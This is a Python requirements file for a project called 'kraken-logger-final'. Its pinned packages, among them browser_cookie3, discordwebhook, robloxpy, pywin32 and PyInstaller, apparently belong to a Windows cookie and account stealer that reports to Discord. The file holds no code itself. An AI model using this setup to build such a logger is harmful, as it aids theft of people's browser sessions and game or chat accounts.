kraken-logger-final/requirements.txt
browser_cookie3==0.16.1
colorama==0.4.5
discordwebhook==1.0.3
httpx==0.23.0
Pillow==9.2.0
psutil==5.9.1
pycryptodome==3.15.0
PyInstaller==5.2
pyotp==2.6.0
pywin32==304
requests==2.28.1
robloxpy==0.2.21
tqdm==4.64.0
pyinstaller>=5.0
PIL-Tools
pypiwin32